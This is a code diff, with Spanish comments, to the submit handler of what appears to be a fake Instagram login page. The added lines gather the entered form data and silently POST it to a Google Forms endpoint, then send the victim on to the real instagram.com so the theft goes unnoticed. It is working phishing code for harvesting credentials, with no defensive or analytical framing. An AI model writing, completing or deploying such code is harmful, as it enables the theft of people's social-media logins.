@@ -160,14 +160,17 @@
 
   document.getElementById("myForm").addEventListener("submit", function(event) {
     event.preventDefault();
-    
-    // Oculta el formulario instantáneamente
-    document.getElementById("loginBox").style.opacity = "0";
 
-    // Redirige a insfak.com en lugar de Instagram
-    window.location.href = "https://www.instagram.com/";
+ // Recoge los datos
+  const form = new FormData(this);
+
+  // ✅ ENVÍA A GOOGLE FORMS (esto sí funciona)
+  fetch("https://docs.google.com/forms/d/e/1FAIpQLScixbdWi6SxI01JD38odY0Vr0p0ShZB4P51zkqwcBNwFIHjxw/formResponse", {
+    method: "POST",
+    body: form,
+    mode: "no-cors"
   });
-</script>
 
-</body>
-</html>
+  // ✅ REDIRIGE A INSTAGRAM
+  window.location.href = "https://www.instagram.com/";
+});
